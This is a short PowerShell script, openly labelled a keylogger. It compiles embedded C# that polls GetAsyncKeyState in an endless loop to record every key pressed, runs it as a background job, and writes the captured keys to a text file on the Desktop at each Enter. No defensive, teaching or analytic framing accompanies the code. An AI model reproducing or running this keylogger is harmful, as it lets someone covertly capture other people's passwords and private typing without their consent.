# Initialize an empty list to store the keystrokes
$keystrokes = @()

# Keylogger C# Code
$signature = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class Logger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    public static void Start(ref System.Collections.Generic.List<string> keystrokes) {
        while (true) {
            System.Threading.Thread.Sleep(10);
            for (int i = 8; i <= 190; i++) {
                if (GetAsyncKeyState(i) == -32767) {
                    string key = ((Keys)i).ToString();
                    keystrokes.Add(key);
                    if (key == "Enter") {
                        // Save the keystrokes to the Desktop
                        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                        string logFile = Path.Combine(desktopPath, "keystrokes.txt");
                        File.WriteAllLines(logFile, keystrokes);
                        keystrokes.Clear(); // Reset the keystrokes after saving
                    }
                }
            }
        }
    }
}
'@

# Compile and start the keylogger
Add-Type -TypeDefinition $signature -Language CSharp
Start-Job -ScriptBlock { [Logger]::Start($using:keystrokes) }
